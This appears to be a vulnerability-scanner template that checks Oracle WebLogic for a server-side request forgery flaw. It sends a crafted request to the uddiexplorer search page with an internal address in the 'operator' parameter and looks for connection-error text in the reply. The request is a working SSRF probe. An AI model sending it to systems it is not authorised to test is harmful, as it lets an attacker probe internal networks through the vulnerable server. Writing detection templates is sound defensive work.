id: weblogic-ssrf
info:
  name: Weblogic SSRF
  author: princechaddha
  severity: medium
  tags: weblogic,oracle,ssrf

requests:
  - method: GET
    path:
      - "{{BaseURL}}/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.1.1.1:700"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "&#39;127.1.1.1&#39;, port:
      &#39;700&#39;"
          - "Socket Closed"
        part: body
        condition: and
